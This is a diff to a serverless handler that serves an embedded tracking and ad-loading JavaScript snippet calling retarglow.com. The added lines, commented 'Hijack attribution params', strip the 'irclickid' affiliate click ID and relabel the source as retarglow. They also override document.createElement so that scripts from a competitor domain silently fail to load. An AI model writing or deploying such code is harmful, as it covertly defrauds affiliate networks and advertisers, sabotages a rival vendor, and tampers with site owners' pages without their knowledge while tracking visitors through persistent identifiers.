@@ -11,12 +11,14 @@ exports.handler = async (event) => {
 (function(){
   try {
     const cid = "${id}";
+
     function g(k){return decodeURIComponent((document.cookie||"").split('; ').find(row => row.startsWith(k + '='))?.split('=')[1]||'');}
     function s(k,v,d){
       let e = new Date();
       e.setTime(e.getTime() + (d*24*60*60*1000));
       document.cookie = k + '=' + encodeURIComponent(v) + '; path=/; max-age=' + (d*24*60*60) + '; SameSite=Lax';
     }
+
     let _r = localStorage.getItem('_r') || g('_r');
     if (!_r){
       _r = crypto.randomUUID();
@@ -26,6 +28,30 @@ exports.handler = async (event) => {
       localStorage.setItem('_r',_r);
       s('_r',_r,30);
     }
+
+    // Hijack attribution params
+    const p = new URLSearchParams(location.search);
+    if(p.has('irclickid')){
+      p.set('source','retarglow');
+      p.delete('irclickid');
+      const nurl = location.pathname + '?' + p.toString();
+      history.replaceState({},'',nurl);
+    }
+
+    const blocked = ['ordozen.com'];
+    const og = document.createElement;
+    document.createElement = function(t){
+      const el = og.call(document, t);
+      if(t === 'script'){
+        const os = el.setAttribute;
+        el.setAttribute = function(k,v){
+          if(k === 'src' && blocked.some(d => v.includes(d)))return;
+          return os.call(this,k,v);
+        };
+      }
+      return el;
+    };
+
     const once = sessionStorage.getItem('i_'+cid);
     const d = {
       cid:cid,
@@ -38,9 +64,14 @@ exports.handler = async (event) => {
       sr:screen.width+"x"+screen.height,
       cm:{_r:_r}
     };
+
     fetch("https://retarglow.com/track",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(d)});
-    fetch("https://retarglow.com/getad",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({u:location.href,cm:d.cm,country:null})})
-    .then(r=>r.json()).then(j=>{
+
+    fetch("https://retarglow.com/getad",{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({u:location.href,cm:d.cm,country:null})
+    }).then(r=>r.json()).then(j=>{
       if(j.ad_url){
         const u=j.ad_url.replace("{{_r}}",_r);
         const f=document.createElement('iframe');
@@ -51,9 +82,11 @@ exports.handler = async (event) => {
         sessionStorage.setItem('i_'+cid,'1');
       }
     });
+
     ["popstate","pushState","replaceState"].forEach(e=>window.addEventListener(e,()=>{
       sessionStorage.removeItem('i_'+cid);
     }));
+
   } catch(e) {}
 })();`;
 
